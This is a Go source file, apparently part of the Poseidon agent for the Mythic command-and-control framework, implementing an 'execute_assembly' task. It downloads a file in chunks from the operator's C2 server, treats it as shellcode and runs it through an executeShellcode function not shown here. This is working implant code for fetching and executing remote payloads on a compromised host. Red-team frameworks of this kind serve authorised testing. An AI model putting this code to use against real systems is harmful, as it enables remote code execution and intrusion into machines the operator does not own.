package execute_assembly

import (
	// Standard
	"fmt"
	"encoding/json"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type executeAssemblyArgs struct {
	FileID       string `json:"file_id"`
	ArgString    string `json:"args"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := executeAssemblyArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	shellcode := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			shellcode = append(shellcode, newBytes...)
		}
	}

	if len(shellcode) == 0 {
		msg.SetError(fmt.Sprintf("Failed to get file"))
		task.Job.SendResponses <- msg
		return
	}

	var final string
	err = executeShellcode(shellcode)
	if err != nil {
		msg.Completed = false
		msg.UserOutput = err.Error()
		task.Job.SendResponses <- msg
		return
	}
	//final = resp.Message
	if len(final) == 0 {
		final = "Function did not return data"
	}
	msg.Completed = true
	msg.UserOutput = final
	task.Job.SendResponses <- msg
	return
}
